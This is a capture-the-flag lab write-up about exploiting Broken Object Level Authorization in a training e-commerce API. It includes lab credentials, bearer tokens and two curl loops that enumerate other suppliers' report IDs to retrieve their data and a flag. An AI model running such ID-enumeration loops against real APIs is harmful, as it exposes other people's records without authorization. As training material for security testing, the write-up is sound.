# Broken Object Level Authorization

Endpoint vulnerability: `Authorization Bypass Through User-Controlled Key`: https://cwe.mitre.org/data/definitions/639.html 

Scenario: The admin Inlanefreight E-Commerce Marketplace has provided us with the credentials `htbpentester1@pentestercompany.com:HTBPentester1`, 
wanting us to assess what API vulnerabilities the user can exploit with their assigned roles.

The account belongs to a Supplier , use /api/v1/authentication/suppliers/sign-in to sign in and obtain JWT.

Authenication -> sign-in -> Supply Credentials in the request -> Execute -> copy JWT -> paste into Authorize under value

<img width="725" height="349" alt="image" src="https://github.com/user-attachments/assets/9c21dda0-1107-4b1a-8d02-02d47906623a" />


<img width="418" height="64" alt="image" src="https://github.com/user-attachments/assets/30b47586-9a7a-4fed-8ac9-34527f6e4e6c" />
<img width="1058" height="67" alt="image" src="https://github.com/user-attachments/assets/12ccac40-ddcc-4713-9a4a-2769a68796ab" />
<img width="1597" height="724" alt="image" src="https://github.com/user-attachments/assets/aef0098d-a946-4199-9d0e-fa14c6d9c03c" />

<img width="1598" height="132" alt="image" src="https://github.com/user-attachments/assets/e866b51d-9f14-49a7-8cf6-5d472a01b61e" />
<img width="1417" height="718" alt="image" src="https://github.com/user-attachments/assets/8fc5ee1e-c8b5-42fb-b353-0643693232f9" />

<img width="1434" height="45" alt="image" src="https://github.com/user-attachments/assets/e4d71cd6-8446-4be9-a9b9-5f048e5244e2" />
<img width="1438" height="276" alt="image" src="https://github.com/user-attachments/assets/4a51b11a-d653-4ca5-b4de-70b1f03bb448" />
<img width="1416" height="247" alt="image" src="https://github.com/user-attachments/assets/9da3b59d-7a52-4a6d-9d6b-b67f1ff82265" />

We can abuse the BOLA vulnerability and fetch the first 20 yearly reports of supplier-companies:

```
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw' | jq
done
```
<img width="1477" height="528" alt="image" src="https://github.com/user-attachments/assets/152b6f0e-54a9-4825-a9bb-497345bb0ee9" />
<img width="513" height="299" alt="image" src="https://github.com/user-attachments/assets/cd02ff44-99f4-4f39-bea2-f35747ff7a85" />


Exploit another Broken Object Level Authorization vulnerability and submit the flag.

Authenicate with `htbpentester2@pentestercompany.com:HTBPentester2`:

<img width="1440" height="40" alt="image" src="https://github.com/user-attachments/assets/1a099c1a-b9f8-475e-b23d-71b095f51e03" />
<img width="694" height="41" alt="image" src="https://github.com/user-attachments/assets/fdc785be-c459-4e79-9a69-e1ddf22eb93b" />
<img width="1445" height="261" alt="image" src="https://github.com/user-attachments/assets/cac5bcfd-0c87-45b1-b4c2-eae82e5224e6" />


<img width="1482" height="453" alt="image" src="https://github.com/user-attachments/assets/f27ce532-2daf-4b3f-958a-c2c43d654a1f" />
<img width="1438" height="534" alt="image" src="https://github.com/user-attachments/assets/0dcdacf5-acae-4ffd-bafe-67f024c697d2" />


```
$ for ((i=1; i<=100; i++)); do
  curl -s -X GET \
  "http://83.136.252.32:37769/api/v1/suppliers/quarterly-reports/$i" \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2OTQ1NTA0NiwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.hzdw-SE_q8bDwGGGG80bqH8Dra4_3Vz3kfVWjJePj4DwA89c5NBjsF944tCCLsGOLlPq_sY6vg9LFGn_YGhgyA' \
  | grep HTB
done
{"supplierQuarterlyReport":{"id":8,"supplierID":"b2d1a1a9-d5bb-4973-bbe4-9a605b6f0da4","quarter":3,"year":2023,"amountSold":10000,"commentsFromManager":"HTB{e7XXXXXXXXXXXXXXXXXXXX4776}"}}
```






